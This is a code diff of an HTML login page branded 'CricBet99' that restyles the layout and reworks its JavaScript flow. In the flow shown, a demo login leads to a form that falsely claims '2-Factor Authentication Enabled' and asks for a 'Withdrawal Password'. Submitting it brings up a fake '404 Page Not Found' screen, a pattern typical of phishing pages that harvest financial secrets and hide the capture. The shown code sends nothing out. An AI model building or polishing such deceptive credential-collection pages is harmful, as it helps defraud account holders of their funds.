@@ -16,19 +16,17 @@
             height: 100vh;
         }
 
-        .login-container {
+        .login-container, .demo-page {
             background-color: #fff;
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             width: 280px;
-            height: 330px;
             text-align: center;
             position: relative;
-            top: -120px;
         }
 
-        .login-container img {
+        .login-container img, .demo-page img.demo-logo {
             width: 350px;
             height: auto;
             position: absolute;
@@ -97,24 +95,52 @@
             text-align: center;
             margin-top: 15px;
         }
-/* Remove space between lines */
-.auth-text {
-    text-align: center;
-    margin-top: 10px;
-    padding: 0; /* Remove any padding */
-}
 
-.line, .password-prompt {
-    font-size: 16px;
-    font-weight: bold;
-    color: black;
-    margin: 0; /* Remove extra margin */
-    padding: 0; /* Remove any padding */
-}
+        .recaptcha-text a {
+            color: #007bff;
+            text-decoration: none;
+        }
 
-        /* Demo Login Form */
-        .demo-page {
+        .recaptcha-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* 404 error style */
+        .error-container {
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 10px;
+            color: white;
+            width: 400px;
             display: none;
+        }
+
+        .error-container h1 {
+            font-size: 72px;
+            margin: 0 0 20px;
+        }
+
+        .error-container p {
+            font-size: 18px;
+            margin: 0 0 20px;
+        }
+
+        .error-container a {
+            color: #fff;
+            background: #8B4513;
+            padding: 10px 20px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 16px;
+        }
+
+        .error-container a:hover {
+            background: #5A3310;
+        }
+
+        /* Adjusted login page position */
+        .login-container {
             background-color: #fff;
             padding: 20px;
             border-radius: 8px;
@@ -122,33 +148,19 @@
             width: 280px;
             text-align: center;
             position: relative;
-            top: -190px;
+            top: -130px;  /* Adjusted to move the login page upwards */
         }
 
-        .demo-page img.demo-logo {
-            width: 350px;
-            height: auto;
-            position: absolute;
-            top: -90px;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-
-        .demo-page input {
-            width: calc(100% - 20px);
-            padding: 10px;
-            margin-top: 15px;
-            border: 1px solid #ced4da;
-            border-radius: 4px;
-        }
-
-        /* 404 Error Page */
-        .error-page {
-            display: none;
+        /* Adjusted demo page position */
+        .demo-page {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 280px;
             text-align: center;
-            font-size: 30px;
-            color: red;
-            margin-top: 50px;
+            position: relative;
+            top: -130px;  /* Adjusted to move the form upwards */
         }
 
     </style>
@@ -156,7 +168,7 @@
 <body>
 
     <!-- Login Form -->
-    <div class="login-container">
+    <div class="login-container" id="loginContainer">
         <img src="logo.png" alt="CricBet99 Logo">
         <div class="form-container">
             <h2>Login</h2>
@@ -175,7 +187,7 @@
             <button class="btn login-demo-btn" onclick="showDemoPage()">Login with Demo ID</button>
             
             <div class="recaptcha-text">
-                <span>This site is protected by reCAPTCHA and the Google</span> 
+                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
                 <a href="#">Privacy Policy</a> and 
                 <a href="#">Terms of Service</a> apply.
             </div>
@@ -183,51 +195,53 @@
     </div>
 
     <!-- Demo Login Form -->
-    <div class="demo-page" id="demoPage">
+    <div class="demo-page" id="demoPage" style="display: none;">
         <img src="logo.png" alt="CricBet99 Logo" class="demo-logo">
         <h2>Login</h2>
         <div class="auth-text">
             <p class="line">2-Factor Authentication Enabled.</p>
             <p class="password-prompt">Enter Your Withdrawal Password</p>
         </div>
-
-        <form id="demoForm">
+        <form id="demoForm" onsubmit="return showErrorPage();">
             <div class="form-group">
                 <input type="text" id="demoUser" name="demoUser" placeholder="Withdrawal Code" required>
             </div>
             <button type="submit" class="btn">Submit</button>
         </form>
         <div class="recaptcha-text">
-            <span>This site is protected by reCAPTCHA and the Google</span> 
+            <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
             <a href="#">Privacy Policy</a> and 
             <a href="#">Terms of Service</a> apply.
         </div>
     </div>
 
-    <!-- Error 404 Page -->
-    <div class="error-page" id="errorPage">
-        <p>404 - Not Found</p>
-        <p>Sorry, the page you're looking for does not exist.</p>
+    <!-- 404 Error Message -->
+    <div class="error-container" id="errorPage">
+        <h1>404</h1>
+        <p>Oops! Page Not Found.</p>
+        <a href="index.html">Go to Homepage</a>
     </div>
 
     <script>
-        // Show demo login form when "Login" button or "Login with Demo ID" button is clicked
         function showDemoPage() {
-            // Hide the main login container
-            document.querySelector('.login-container').style.display = 'none';
-            // Show the demo login form
+            // Hide the login form
+            document.getElementById('loginContainer').style.display = 'none';
+            
+            // Show the demo page
             document.getElementById('demoPage').style.display = 'block';
-            return false; // Prevent default form submission
+            
+            return false; // Prevent form submission
         }
 
-        // Handle the demo form submission (where withdrawal code is entered)
-        document.getElementById('demoForm').addEventListener('submit', (e) => {
-            e.preventDefault();
-            // Hide the demo login form
+        function showErrorPage() {
+            // Hide the demo page
             document.getElementById('demoPage').style.display = 'none';
-            // Show the error page
+            
+            // Show the 404 error page
             document.getElementById('errorPage').style.display = 'block';
-        });
+            
+            return false; // Prevent form submission and page redirect
+        }
     </script>
 
 </body>
